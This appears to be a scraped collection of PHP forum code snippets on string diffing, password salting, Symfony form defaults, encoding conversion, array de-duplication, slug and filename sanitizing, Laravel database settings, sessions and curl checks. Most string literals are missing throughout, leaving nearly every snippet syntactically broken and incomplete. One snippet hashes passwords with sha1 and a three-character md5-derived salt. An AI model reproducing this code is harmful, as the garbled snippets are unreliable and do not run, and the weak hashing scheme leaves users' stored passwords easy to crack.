/** * @brief Find the difference between two strings, lines assumed to be separated by "\n| * @param $new string The new string * @param $old string The old string * @return string Human-readable output as produced by the Unix diff command, * or "No changes" if the strings are the same. * @throws Exception */ public static function diff($new, $old) { $tempdir = $oldfile = tempnam($tempdir, $newfile = tempnam($tempdir, if (!@file_put_contents($oldfile,$old)) { throw new Exception( print_r(error_get_last(),true)); } if (!@file_put_contents($newfile,$new)) { throw new Exception( print_r(error_get_last(),true)); } $answer = array(); $cmd = "diff $newfile $oldfile"; exec($cmd, $answer, $retcode); unlink($newfile); unlink($oldfile); if ($retcode != 1) { throw new Exception( } if (empty($answer)) { return } else { return implode("\n", $answer); } }
function createSalt() { $string = md5(uniqid(rand(), true)); return substr($string, 0, 3); } $salt = createSalt(); $hash = sha1($salt . $hash);
$hash = password_hash($password, PASSWORD_DEFAULT, [ if (password_verify($password, $hash)) { }
SHA512 => aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d Crypt/SHA512 => $6$rounds=5000$usesomesillystri$D4IrlXatmP7rx3P3InaxBeoomnAihCKRVQP22JZ6EY47Wc6BkroIuUUBOov1i.S5KPgErtP/EN5mcO.ChWQW21
function getFactory() { $obj = new static(); $obj->setBar( $obj->setFoo( return $obj; }
if( ! $entity->isFromDB() ) { $entity->setBar( $entity->setDate( date( ... } $form = $this->createForm(...)
form_widget(form.foo, {attr: { value : default } });
public function buildForm(FormBuilderInterface $builder, array $options) { $builder ... ->add( array( ) ); }
class Entity { private $color; public function __construct(){ $this->color = ... } ... }
public function buildForm(FormBuilderInterface $builder, array $options) { $builder->add( ) ); }
$defaultData = array( $form = $this->createFormBuilder($defaultData) ->add( ->add( ->add( ->add( ->getForm();
$user = new User(); $user->setUsername( $form = $this->createFormBuilder($user) ->add( ->getForm();
class DefaultFormTypeExtension extends AbstractTypeExtension { public function buildForm(FormBuilderInterface $builder, array $options) { if (null !== $options[ $builder->addEventListener( FormEvents::PRE_SET_DATA, function (FormEvent $event) use ($options) { if (null === $event->getData()) { $event->setData($options[ } } ); } } public function configureOptions(OptionsResolver $resolver) { $resolver->setDefault( } public function getExtendedType() { return FormType::class; } }
app.form_type_extension: class: App\Form\Extension\DefaultFormTypeExtension tags: - { name: form.type_extension, extended_type: Symfony\Component\Form\Extension\Core\Type\FormType }
->addEventListener(FormEvents::PRE_SET_DATA, function (FormEvent $event) { $form = $event->getForm(); $data = $event->getData(); if ($data == null) { $form->add( } });
$values = array( ); $formBuilder = $this->createFormBuilder($values); $formBuilder->add(
... use Symfony\Component\Form\FormEvent; use Symfony\Component\Form\FormEvents; ... public function buildForm( FormBuilderInterface $builder, array $options ) { ... $builder->add( )); $builder->addEventListener( FormEvents::PRE_SET_DATA, function(FormEvent $event){ $foo = $event->getData(); if(is_null($foo->getActive())) $data->setActive(true); } ); } public function configureOptions( OptionsResolver $resolver ) { $resolver->setDefaults(array( )); }
class LoadSurgeonPlanData implements FixtureInterface { public function load(ObjectManager $manager) { $surgeonPlan = new SurgeonPlan(); $surgeonPlan->setName( $surgeonPlan->setPrice(0); $surgeonPlan->setDelayWorkHours(0); $surgeonPlan->setSlug( $manager->persist($surgeonPlan); $manager->flush(); } }
$defaults = array( $form = $this->formfactory->createBuilder( ->add( ->add( ->add( ->getForm();
public function buildForm(FormBuilderInterface $builder, array $options) { $data = $builder->getData(); $builder->add( )); }
$project = new Project(); $project->setColor( $form = $this->createForm(new ProjectType(), $project);
public function getMyField() { if (is_null($this->MyField)) { $this->setMyField( } return $this->MyField; }
/** * @var int * @ORM\Column(type="integer", nullable=true) */ protected $development_time = 0;
Vendor\laravel\framework\src\illuminate\Datebase\Eloquent\Model.php
class User extends Model { protected $table = public $timestamps = false; }
$users = new Users(); $users->timestamps = false; $users->name = $users->email = $users->save();
public function setUpdatedAt($value) { } public function getUpdatedAtColumn() { }
iconv(mb_detect_encoding($text, mb_detect_order(), true), "UTF-8", $text);
encoding_1: 190 => 0.095249209893009, 222 => 0.095249209893009, ... encoding_2: 239 => 0.095249209893009, 207 => 0.095249209893009, ... encoding_N: charcode => probabilty
$text = "fiancée"; echo mb_convert_encoding($text, "UTF-8"); echo "<br/><br/>"; echo iconv(mb_detect_encoding($text), "UTF-8", $text);
private function isUTF8($encoding, $value) { return (($encoding === } private function utf8tify(&$value) { $encodings = [ mb_internal_encoding( mb_substitute_character(0xfffd); mb_detect_order($encodings); $stringEncoding = mb_detect_encoding($value, $encodings, true); if (!$stringEncoding) { $value = null; throw new \RuntimeException("Unable to identify character encoding in sanitizer."); } if ($this->isUTF8($stringEncoding, $value)) { return; } else { $value = mb_convert_encoding($value, $stringEncoding = mb_detect_encoding($value, $encodings, true); if ($this->isUTF8($stringEncoding, $value)) { return; } else { $value = null; throw new \RuntimeException("Unable to convert character encoding from ISO-8859-1, or ASCII, to UTF-8 in Sanitizer."); } } return; }
public function convertToUtf8($text) { if(!$this->html) $this->html = cURL( $html = $this->html; preg_match( $charset = $matches[2]; if($charset) return mb_convert_encoding($text, else return $text; }
curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$connection = new mysqli($server, $user, $pass, $db); $connection->set_charset("utf8");
$array = array(1, 2, 2, 3); $array = array_unique($array);
$arr = array( ); $unique = array_unique($arr); $dupes = array_diff_key( $arr, $unique ); array_count_values($dupes);
$unique=array("","A1","","A2","","A1",""); $duplicated=array(); foreach($unique as $k=>$v) { if( ($kt=array_search($v,$unique))!==false and $k!=$kt ) { unset($unique[$kt]); $duplicated[]=$v; } } sort($unique); sort($duplicated);
$result = array(); foreach ($array as $key => $value){ if(!in_array($value, $result)) $result[$key]=$value; }
$array = array (1,3,4,2,1,7,4,9,7,5,9); $data=array(); foreach($array as $value ){ $data[$value]= $value; } array_keys($data); OR array_values($data);
$arrDuplicate = array ("","",1,3,"",5); foreach (array_unique($arrDuplicate) as $v){ if($v != "") { $arrRemoved[] = $v; } } print_r ($arrRemoved);
$array = array_values( array_flip( array_flip( $array ) ) );
if (@!in_array($classified->category,$arr)){ $arr[] = $classified->category; ?> <?php } endwhile; wp_reset_query(); ?>
$arrDup = Array ( foreach($arrDup as $k => $v){ if(!( isset ($hold[$v]))) $hold[$v]=1; else unset($arrDup[$k]); }
$arrDuplicate = array ("","",1,3,"",5); foreach(array_unique($arrDuplicate) as $v){ if($v != "" ){$arrRemoved = $v; }} print_r($arrRemoved);
function arrayUnique($myArray) { $newArray = Array(); if (is_array($myArray)) { foreach($myArray as $key=>$val) { if (is_array($val)) { $val2 = arrayUnique($val); } else { $val2 = $val; $newArray=array_unique($myArray); $newArray=deleteEmpty($newArray); break; } if (!empty($val2)) { $newArray[$key] = $val2; } } } return ($newArray); } function deleteEmpty($myArray) { $retArray= Array(); foreach($myArray as $key=>$val) { if (($key<>"") && ($val<>"")) { $retArray[$key] = $val; } } return $retArray; }
$array = array (1,4,2,1,7,4,9,7,5,9); $unique = array(); foreach($array as $v){ isset($k[$v]) || ($k[$v]=1) && $unique[] = $v; } var_dump($unique);
array(6) { [0]=> int(1) [1]=> int(4) [2]=> int(2) [3]=> int(7) [4]=> int(9) [5]=> int(5) }
<?php $arr1 = [1,1,2,3,4,5,6,3,1,3,5,3,20]; print_r(arr_unique($arr1)); function arr_unique($arr) { sort($arr); $curr = $arr[0]; $uni_arr[] = $arr[0]; for($i=0; $i<count($arr);$i++){ if($curr != $arr[$i]) { $uni_arr[] = $arr[$i]; $curr = $arr[$i]; } } return $uni_arr; }
$filter = array_map("unserialize", array_unique(array_map("serialize", $arr))); $array = array_unique($arr, SORT_REGULAR);
$a = array(1,2,3,1,3,4,5); $count = count($a); $b = []; for($i=0; $i<$count; $i++){ if(!in_array($a[$i], $b)){ array_push($b, $a[$i]); } } print_r ($b);
function duplicate($arr) { $duplicate; $count = array_count_values($arr); foreach($arr as $key => $value) { if ($count[$value] > 1) { $duplicate[$value] = $value; } } return $duplicate; } function single($arr) { $single; $count = array_count_values($arr); foreach($arr as $key => $value) { if ($count[$value] == 1) { $single[$value] = $value; } } return $single; } function full($arr, $arry) { $full = $arr + $arry; sort($full); return $full; }
$arr = array("1", "2", "3", "4", "5", "4", "2", "1"); $len = count($arr); for ($i = 0; $i < $len; $i++) { $temp = $arr[$i]; $j = $i; for ($k = 0; $k < $len; $k++) { if ($k != $j) { if ($temp == $arr[$k]) { echo $temp."<br>"; $arr[$k]=" "; } } } } for ($i = 0; $i < $len; $i++) { echo $arr[$i] . " <br><br>"; }
/** * Convert a string to the file/URL safe "slug" form * * @param string $string the string to clean * @param bool $is_filename TRUE will allow additional filename characters * @return string */ function sanitize($string = { $string = preg_replace( return mb_strtolower(preg_replace( }
canonicalize (string $input, [bool $strict = true]) decodeFromBase64 (string $input) decodeFromURL (string $input) encodeForBase64 (string $input, [bool $wrap = false]) encodeForCSS (string $input) encodeForHTML (string $input) encodeForHTMLAttribute (string $input) encodeForJavaScript (string $input) encodeForOS (Codec $codec, string $input) encodeForSQL (Codec $codec, string $input) encodeForURL (string $input) encodeForVBScript (string $input) encodeForXML (string $input) encodeForXMLAttribute (string $input) encodeForXPath (string $input)
/** * Function: sanitize * Returns a sanitized string, typically for URLs. * * Parameters: * $string - The string to sanitize. * $force_lowercase - Force the string to lowercase? * $anal - If set to *true*, will remove all non-alphanumeric characters. */ function sanitize($string, $force_lowercase = true, $anal = false) { $strip = array("~", "`", "!", "@", " "}", "\\", "|", ";", ":", "\"", " "â€”", "â€“", ",", "<", ".", ">", "/", "?"); $clean = trim(str_replace($strip, "", strip_tags($string))); $clean = preg_replace( $clean = ($anal) ? preg_replace("/[^a-zA-Z0-9]/", "", $clean) : $clean ; return ($force_lowercase) ? (function_exists( mb_strtolower($clean, strtolower($clean) : $clean; }
/** * Sanitizes a filename replacing whitespace with dashes * * Removes special characters that are illegal in filenames on certain * operating systems and special characters requiring special escaping * to manipulate at the command line. Replaces spaces and consecutive * dashes with a single dash. Trim period, dash and underscore from beginning * and end of filename. * * @since 2.1.0 * * @param string $filename The filename to be sanitized * @return string The sanitized filename */ function sanitize_file_name( $filename ) { $filename_raw = $filename; $special_chars = array("?", "[", "]", "/", "\\", "=", "<", ">", ":", ";", ",", " $special_chars = apply_filters( $filename = str_replace($special_chars, $filename = preg_replace( $filename = trim($filename, return apply_filters( }
$clean_name = strtr($string, array( $clean_name = strtr($clean_name, array( $clean_name = preg_replace(array(
function normal_chars($string) { $string = htmlentities($string, ENT_QUOTES, $string = preg_replace( $string = html_entity_decode($string, ENT_QUOTES, $string = preg_replace(array( return trim($string, } Examples: echo normal_chars( echo normal_chars( echo normal_chars(
/var/www/uploads/123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345/
(0 + 0 + 244 + 11 chars) C:\1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234\1234567.txt (0 + 3 + 240 + 11 chars) C:\123\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\1234567.txt (3 + 3 + 236 + 11 chars) C:\123\456\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456\1234567.txt
(255 chars) E:\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901.txt
Warning: touch(): Unable to create file ... because No error in ... on line ...
public static function title($title, $separator = { if ($ascii_only === TRUE) { $title = UTF8::transliterate_to_ascii($title); $title = preg_replace( } else { $title = preg_replace( } $title = preg_replace( return trim($title, $separator); }
$userFilename = ESAPI::getEncoder()->canonicalize($input_string); $safeFilename = ESAPI::getRandomizer()->getRandomFilename();
$safeForURL = ESAPI::getEncoder()->encodeForURL($input_string);
/** * Convert a string into a url safe address. * * @param string $unformatted * @return string */ public function formatURL($unformatted) { $url = strtolower(trim($unformatted)); $search = array( $replace = array( $url = str_replace($search, $replace, $url); $search = array( $replace = array( $url= str_replace($search, $replace, $url); $find = array( $url = str_replace($find, $find = array( $replace = array( $uri = preg_replace($find, $replace, $url); return $uri; }
public static function makeSafe($file) { $file = rtrim($file, $regex = array( return trim(preg_replace($regex, }
/** * Sanitize Filename * * @param string $str Input file name * @param bool $relative_path Whether to preserve paths * @return string */ public function sanitize_filename($str, $relative_path = FALSE) { $bad = array( " ); if ( ! $relative_path) { $bad[] = $bad[] = } $str = remove_invisible_characters($str, FALSE); return stripslashes(str_replace($bad, }
function remove_invisible_characters($str, $url_encoded = TRUE) { $non_displayables = array(); if ($url_encoded) { $non_displayables[] = $non_displayables[] = } $non_displayables[] = do { $str = preg_replace($non_displayables, } while ($count); return $str; }
<?php echo URLify::filter ( echo URLify::filter ( ?>
$file_name = trim(basename(stripslashes($name)), ".\x00..\x20");
<?php namespace COil\Bundle\COilCoreBundle\Component\HttpKernel\Util; use Symfony\Component\HttpKernel\Util\Filesystem as BaseFilesystem; /** * Extends the Symfony filesystem object. */ class Filesystem extends BaseFilesystem { /** * Make a filename safe to use in any function. (Accents, spaces, special chars...) * The iconv function must be activated. * * @param string $fileName The filename to sanitize (with or without extension) * @param string $defaultIfEmpty The default string returned for a non valid filename (only special chars or separators) * @param string $separator The default separator * @param boolean $lowerCase Tells if the string must converted to lower case * * @author COil <https: * @see http: * * @return string */ public function sanitizeFilename($fileName, $defaultIfEmpty = { $fileInfos = pathinfo($fileName); $fileExt = array_key_exists( $fileName = @iconv( $fileName = preg_replace("/[^ a-zA-Z". preg_quote($separator). "\d\.\s]/", $fileName = preg_replace( $fileName = trim($fileName, $separator); if (empty($fileName)) { $fileName = $defaultIfEmpty; } return $fileName. $fileExt; } }
<?php namespace COil\Bundle\COilCoreBundle\Tests\Unit\Helper; use COil\Bundle\COilCoreBundle\Component\HttpKernel\Util\Filesystem; /** * Test the Filesystem custom class. */ class FilesystemTest extends \PHPUnit_Framework_TestCase { /** * test sanitizeFilename() */ public function testFilesystem() { $fs = new Filesystem(); $this->assertEquals( $this->assertEquals( $this->assertEquals( $this->assertEquals( $this->assertEquals( $this->assertEquals( $this->assertEquals( $this->assertEquals( $this->assertEquals( $this->assertEquals( $this->assertEquals( $this->assertEquals( $this->assertEquals( $this->assertEquals( $this->assertEquals( $this->assertEquals( $userId = rand(1, 10); $this->assertEquals( } }
All tests pass: phpunit -c app/ src/COil/Bundle/COilCoreBundle/Tests/Unit/Helper/FilesystemTest.php PHPUnit 3.6.10 by Sebastian Bergmann. Configuration read from /var/www/strangebuzz.com/app/phpunit.xml.dist . Time: 0 seconds, Memory: 5.75Mb OK (1 test, 17 assertions)
function sanitize($string,$force_lowercase=true) { $clean = strip_tags($string); $clean = strtr($clean, array( $clean = strtr($clean, array( $clean = str_replace("--", "-", preg_replace("/[^a-z0-9-]/i", "", preg_replace(array( return ($force_lowercase) ? (function_exists( mb_strtolower($clean, strtolower($clean) : $clean; }
public function getFriendlyURL($string) { setlocale(LC_CTYPE, $string = iconv( $string = preg_replace( $string = str_replace( $string = trim($string, "-"); $string = strtolower($string); return $string; }
function replaceAccentedChars($str) { $patterns = array( $replacements = array( ); return preg_replace($patterns, $replacements, $str); } function str2url($str) { if (function_exists( $str = mb_strtolower($str, $str = trim($str); if (!function_exists( $str = replaceAccentedChars($str); $str = preg_replace( $str = preg_replace( $str = str_replace(array( if (!function_exists( $str = strtolower($str); return $str; }
function clean_filename($source_file) { $search[] = " "; $search[] = "&"; $search[] = "$"; $search[] = ","; $search[] = "!"; $search[] = "@"; $search[] = " $search[] = "^"; $search[] = "("; $search[] = ")"; $search[] = "+"; $search[] = "="; $search[] = "["; $search[] = "]"; $replace[] = "_"; $replace[] = "and"; $replace[] = "S"; $replace[] = "_"; $replace[] = ""; $replace[] = ""; $replace[] = ""; $replace[] = ""; $replace[] = ""; $replace[] = ""; $replace[] = ""; $replace[] = ""; $replace[] = ""; $replace[] = ""; return str_replace($search,$replace,$source_file); }
<?php $d = new DateTime( echo $d->format( $d = new DateTime( $d->modify( echo $d->format( echo date_create( ->modify( ->format(
<?php echo (new DateTime( echo (new DateTime( ->modify( ->format(
$week_start = strtotime( $week_end = strtotime( $month_start = strtotime( $month_end = strtotime( $year_start = strtotime( $year_end = strtotime( echo date( echo date( echo date( echo date( echo date( echo date(
$firstDay = new \DateTime( $lastDay = new \DateTime(
$firstDay = new \DateTime( $lastDay = new \DateTime(
<? $d = date_create(); print date_create($d->format(
function gen_slug($str){ $a = array( $b = array( return strtolower(preg_replace(array( }
public static function slugify($text) { $text = preg_replace( $text = iconv( $text = preg_replace( $text = trim($text, $text = preg_replace( $text = strtolower($text); if (empty($text)) { return } return $text; }
<?php $string = "andrés"; $string = transliterator_transliterate("Any-Latin; NFD; [:Nonspacing Mark:] Remove; NFC; [:Punctuation:] Remove; Lower();", $string); echo $string; ?>
function utf8_uri_encode( $utf8_string, $length = 0 ) { $unicode = $values = array(); $num_octets = 1; $unicode_length = 0; $string_length = strlen( $utf8_string ); for ($i = 0; $i < $string_length; $i++ ) { $value = ord( $utf8_string[ $i ] ); if ( $value < 128 ) { if ( $length && ( $unicode_length >= $length ) ) break; $unicode .= chr($value); $unicode_length++; } else { if ( count( $values ) == 0 ) $num_octets = ( $value < 224 ) ? 2 : 3; $values[] = $value; if ( $length && ( $unicode_length + ($num_octets * 3) ) > $length ) break; if ( count( $values ) == $num_octets ) { if ($num_octets == 3) { $unicode .= $unicode_length += 9; } else { $unicode .= $unicode_length += 6; } $values = array(); $num_octets = 1; } } } return $unicode; } function seems_utf8($str) { $length = strlen($str); for ($i=0; $i < $length; $i++) { $c = ord($str[$i]); if ($c < 0x80) $n = 0; elseif (($c & 0xE0) == 0xC0) $n=1; elseif (($c & 0xF0) == 0xE0) $n=2; elseif (($c & 0xF8) == 0xF0) $n=3; elseif (($c & 0xFC) == 0xF8) $n=4; elseif (($c & 0xFE) == 0xFC) $n=5; else return false; for ($j=0; $j<$n; $j++) { if ((++$i == $length) || ((ord($str[$i]) & 0xC0) != 0x80)) return false; } } return true; } function sanitize($title) { $title = strip_tags($title); $title = preg_replace( $title = str_replace( $title = preg_replace( if (seems_utf8($title)) { if (function_exists( $title = mb_strtolower($title, } $title = utf8_uri_encode($title, 200); } $title = strtolower($title); $title = preg_replace( $title = str_replace( $title = preg_replace( $title = preg_replace( $title = preg_replace( $title = trim($title, return $title; }
/** * Function used to create a slug associated to an "ugly" string. * * @param string $string the string to transform. * * @return string the resulting slug. */ public static function createSlug($string) { $table = array( ); $stripped = preg_replace(array( return strtolower(strtr($string, $table)); }
<?php /** * Set the mbstring internal encoding to a binary safe encoding when func_overload * is enabled. * * When mbstring.func_overload is in use for multi-byte encodings, the results from * strlen() and similar functions respect the utf8 characters, causing binary data * to return incorrect lengths. * * This function overrides the mbstring encoding to a binary-safe encoding, and * resets it to the users expected encoding afterwards through the * `reset_mbstring_encoding` function. * * It is safe to recursively call this function, however each * `mbstring_binary_safe_encoding()` call must be followed up with an equal number * of `reset_mbstring_encoding()` calls. * * @since 3.7.0 * * @see reset_mbstring_encoding() * * @param bool $reset Optional. Whether to reset the encoding back to a previously-set encoding. * Default false. */ function mbstring_binary_safe_encoding( $reset = false ) { static $encodings = array(); static $overloaded = null; if ( is_null( $overloaded ) ) $overloaded = function_exists( if ( false === $overloaded ) return; if ( ! $reset ) { $encoding = mb_internal_encoding(); array_push( $encodings, $encoding ); mb_internal_encoding( } if ( $reset && $encodings ) { $encoding = array_pop( $encodings ); mb_internal_encoding( $encoding ); } } /** * Reset the mbstring internal encoding to a users previously set encoding. * * @see mbstring_binary_safe_encoding() * * @since 3.7.0 */ function reset_mbstring_encoding() { mbstring_binary_safe_encoding( true ); } /** * Checks to see if a string is utf8 encoded. * * NOTE: This function checks for 5-Byte sequences, UTF8 * has Bytes Sequences with a maximum length of 4. * * @author bmorel at ssi dot fr (modified) * @since 1.2.1 * * @param string $str The string to be checked * @return bool True if $str fits a UTF-8 model, false otherwise. */ function seems_utf8($str) { mbstring_binary_safe_encoding(); $length = strlen($str); reset_mbstring_encoding(); for ($i=0; $i < $length; $i++) { $c = ord($str[$i]); if ($c < 0x80) $n = 0; elseif (($c & 0xE0) == 0xC0) $n=1; elseif (($c & 0xF0) == 0xE0) $n=2; elseif (($c & 0xF8) == 0xF0) $n=3; elseif (($c & 0xFC) == 0xF8) $n=4; elseif (($c & 0xFE) == 0xFC) $n=5; else return false; for ($j=0; $j<$n; $j++) { if ((++$i == $length) || ((ord($str[$i]) & 0xC0) != 0x80)) return false; } } return true; } /** * Encode the Unicode values to be used in the URI. * * @since 1.5.0 * * @param string $utf8_string * @param int $length Max length of the string * @return string String with Unicode encoded for URI. */ function utf8_uri_encode( $utf8_string, $length = 0 ) { $unicode = $values = array(); $num_octets = 1; $unicode_length = 0; mbstring_binary_safe_encoding(); $string_length = strlen( $utf8_string ); reset_mbstring_encoding(); for ($i = 0; $i < $string_length; $i++ ) { $value = ord( $utf8_string[ $i ] ); if ( $value < 128 ) { if ( $length && ( $unicode_length >= $length ) ) break; $unicode .= chr($value); $unicode_length++; } else { if ( count( $values ) == 0 ) $num_octets = ( $value < 224 ) ? 2 : 3; $values[] = $value; if ( $length && ( $unicode_length + ($num_octets * 3) ) > $length ) break; if ( count( $values ) == $num_octets ) { if ($num_octets == 3) { $unicode .= $unicode_length += 9; } else { $unicode .= $unicode_length += 6; } $values = array(); $num_octets = 1; } } } return $unicode; } /** * Sanitizes a title, replacing whitespace and a few other characters with dashes. * * Limits the output to alphanumeric characters, underscore (_) and dash (-). * Whitespace becomes a dash. * * @since 1.2.0 * * @param string $title The title to be sanitized. * @param string $raw_title Optional. Not used. * @param string $context Optional. The operation for which the string is sanitized. * @return string The sanitized title. */ function sanitize_title_with_dashes( $title, $raw_title = $title = strip_tags($title); $title = preg_replace( $title = str_replace( $title = preg_replace( if (seems_utf8($title)) { if (function_exists( $title = mb_strtolower($title, } $title = utf8_uri_encode($title, 200); } $title = strtolower($title); $title = preg_replace( $title = str_replace( if ( $title = str_replace( array( $title = str_replace( array( ), $title = str_replace( } $title = preg_replace( $title = preg_replace( $title = preg_replace( $title = trim($title, return $title; } $title = echo "title -> slug: \n". $title ." -> ". sanitize_title_with_dashes($title); echo "\n\n"; $title = echo "title -> slug: \n". $title ." -> ". sanitize_title_with_dashes($title);
function normalize ($string) { $table = array( ); return strtr($string, $table); }
function slugify($text) { $text = iconv( return strtolower(preg_replace( }
public static function slugify ($text) { $replace = [ ]; $text = strtr($text, $replace); $text = preg_replace( $text = trim($text, $text = preg_replace( $text = strtolower($text); return $text; }
function slugify( $string, $separator = $accents_regex = $special_cases = array( $string = mb_strtolower( trim( $string ), $string = str_replace( array_keys($special_cases), array_values( $special_cases), $string ); $string = preg_replace( $accents_regex, $string = preg_replace("/[^a-z0-9]/u", "$separator", $string); $string = preg_replace("/[$separator]+/u", "$separator", $string); return $string; }
<?php function slugify($url) { $url = trim($url); $url = str_replace(" ","-",$url); $url = str_replace("/","-slash-",$url); $url = rawurlencode($url); } ?>
function slugify ($string) { $string = utf8_encode($string); $string = iconv( $string = preg_replace( $string = str_replace( $string = trim($string, $string = strtolower($string); if (empty($string)) { return } return $string; }
<? setlocale( LC_ALL, "en_US.UTF8" ); function slug( $string ) { $string = iconv( "utf-8", "us-ascii $string = str_replace( " $string = preg_replace( "~[^\pL\d]+~u", "-", $string ); $string = preg_replace( "~[^-\w]+~", "", $string ); $string = preg_replace( "~-+~", "-", $string ); $string = trim( $string, "-" ); $string = trim( $string ); $string = mb_strtolower( $string, "utf-8" ); $string = urlencode( $string ); return $string; }; ?>
<?php use Behat\Transliterator\Transliterator; class Urlizer extends Transliterator { }
$text = "Master Ápiu"; $urlizer = new Urlizer(); $slug = $urlizer->transliterate($slug, "-"); echo $slug;
<?php function slugify(STRING $string, STRING $separator = $accents_regex = $special_cases = [ $string = mb_strtolower( trim( $string ), $string = str_replace( array_keys($special_cases), array_values( $special_cases), $string ); $string = preg_replace( $accents_regex, $string = preg_replace( return preg_replace( } function slug(STRING $string, STRING $separator = $string = transliterator_transliterate( return str_replace( } function slugbis($text){ $replace = [ ]; $text = strtr($text, $replace); $text = preg_replace( $text = trim($text, $text = preg_replace( return strtolower($text); } function slugagain($string){ $table = [ ]; return strtr($string, $table); } function slugifybis($url){ $url = trim($url); $url = str_replace( $url = str_replace( return rawurlencode($url); } setlocale( LC_ALL, "en_US.UTF8" ); function slugifyagain($string){ $string = iconv( $string = str_replace(" $string = preg_replace( $string = preg_replace( $string = preg_replace( $string = trim($string, $string = trim($string); $string = mb_strtolower($string, return urlencode($string); }; $string = $newString = "¿ Àñdréß l $max = 10000; echo echo echo echo echo echo echo echo echo echo echo echo $start = microtime(true); for($i = 0 ; $i < $max ; $i++){ $newString = slugify($string); } $time = (microtime(true) - $start) * 1000; echo echo echo echo echo $start = microtime(true); for($i = 0 ; $i < $max ; $i++){ $newString = slug($string); } $time = (microtime(true) - $start) * 1000; echo echo echo echo echo $start = microtime(true); for($i = 0 ; $i < $max ; $i++){ $newString = slugbis($string); } $time = (microtime(true) - $start) * 1000; echo echo echo echo echo $start = microtime(true); for($i = 0 ; $i < $max ; $i++){ $newString = slugagain($string); } $time = (microtime(true) - $start) * 1000; echo echo echo echo echo $start = microtime(true); for($i = 0 ; $i < $max ; $i++){ $newString = slugifybis($string); } $time = (microtime(true) - $start) * 1000; echo echo echo echo echo $start = microtime(true); for($i = 0 ; $i < $max ; $i++){ $newString = slugifyagain($string); } $time = (microtime(true) - $start) * 1000; echo echo echo echo
APP_ENV=local APP_DEBUG=true APP_KEY=***** DB_HOST=localhost DB_DATABASE=homestead DB_USERNAME=homestead DB_PASSWORD=secret
DB_HOST=localhost DB_DATABASE=laravelu DB_USERNAME=root DB_PASSWORD=
APP_ENV=local APP_DEBUG=true APP_KEY=someRandomNumber DB_HOST=localhost DB_DATABASE=homestead DB_USERNAME=homestead DB_PASSWORD=secret CACHE_DRIVER=file SESSION_DRIVER=file QUEUE_DRIVER=sync MAIL_DRIVER=smtp MAIL_HOST=mailtrap.io MAIL_PORT=2525 MAIL_USERNAME=null MAIL_PASSWORD=null
DB_HOST=yourHostName DB_DATABASE=yourDatabaseName DB_USERNAME=yourDatabaseUsername DB_PASSWORD=youPassword
DB_HOST=192.168.10.10 DB_DATABASE=homestead DB_USERNAME=homestead
[PDOException] SQLSTATE[HY000] [2002] No such file or directory
mysql> show variables like +-----------------------------------------+-----------------------------+ | Variable_name | Value | +-----------------------------------------+-----------------------------+ | performance_schema_max_socket_classes | 10 | | performance_schema_max_socket_instances | 322 | | socket | /var/run/mysqld/mysqld.sock | +-----------------------------------------+-----------------------------+ 3 rows in set (0.00 sec)
APP_ENV=local APP_DEBUG=true APP_KEY=SomeRandomString DB_HOST=localhost DB_DATABASE=homestead DB_USERNAME=homestead DB_PASSWORD=secret CACHE_DRIVER=file SESSION_DRIVER=file QUEUE_DRIVER=sync MAIL_DRIVER=smtp MAIL_HOST=mailtrap.io MAIL_PORT=2525 MAIL_USERNAME=null MAIL_PASSWORD=null MAIL_ENCRYPTION=null
$ homestead ssh $ mysql -u root -p Enter password: secret mysql> grant all privileges on *.* to Query OK, 0 rows affected (0.00 sec) exit
DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=homestead DB_USERNAME=homestead DB_PASSWORD=secret
DB_HOST=localhost DB_DATABASE=homestead DB_USERNAME=homestead DB_PASSWORD=secret
$ touch database/database.sqlite $ php artisan tinker Psy Shell v0.8.0 (PHP 5.6.27 — cli) by Justin Hileman >>> database_path(‘database.sqlite’) => "/Users/connorleech/Projects/laravel-5-rest-api/database/database.sqlite"
DB_CONNECTION=sqlite DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=/Users/connorleech/Projects/laravel-5-rest-api/database/database.sqlite DB_USERNAME=homestead DB_PASSWORD=secret
ini_set( session_set_cookie_params(3600); session_start();
session_start(); $now = time(); if (isset($_SESSION[ session_unset(); session_destroy(); session_start(); } $_SESSION[
<?php class FileSessionHandler { private $savePath; private $lifetime; function open($savePath, $sessionName) { $this->savePath = $this->lifetime = 3600; if (!is_dir($this->savePath)) { mkdir($this->savePath, 0777); } return true; } function close() { return true; } function read($id) { return (string)@file_get_contents("$this->savePath/sess_$id"); } function write($id, $data) { return file_put_contents("$this->savePath/sess_$id", $data) === false ? false : true; } function destroy($id) { $file = "$this->savePath/sess_$id"; if (file_exists($file)) { unlink($file); } return true; } function gc($maxlifetime) { foreach (glob("$this->savePath/sess_*") as $file) { if (filemtime($file) + $this->lifetime < time() && file_exists($file)) { unlink($file); } } return true; } } $handler = new FileSessionHandler(); session_set_save_handler( array($handler, array($handler, array($handler, array($handler, array($handler, array($handler, ); register_shutdown_function( session_set_cookie_params(3600); session_start();
if(time() - $_SESSION[ header("Location: logout.php"); } else { $_SESSION[ }
mv /etc/cron.hourly/plesk-php-cleanuper /etc/cron.daily/
<?php $ch = curl_init($url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); curl_setopt($ch,CURLOPT_TIMEOUT,10); $output = curl_exec($ch); $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); return $httpcode; ?>
if(!$url || !is_string($url) || ! preg_match( return false; }
@curl_setopt($ch, CURLOPT_HEADER , true); @curl_setopt($ch, CURLOPT_NOBODY , true);
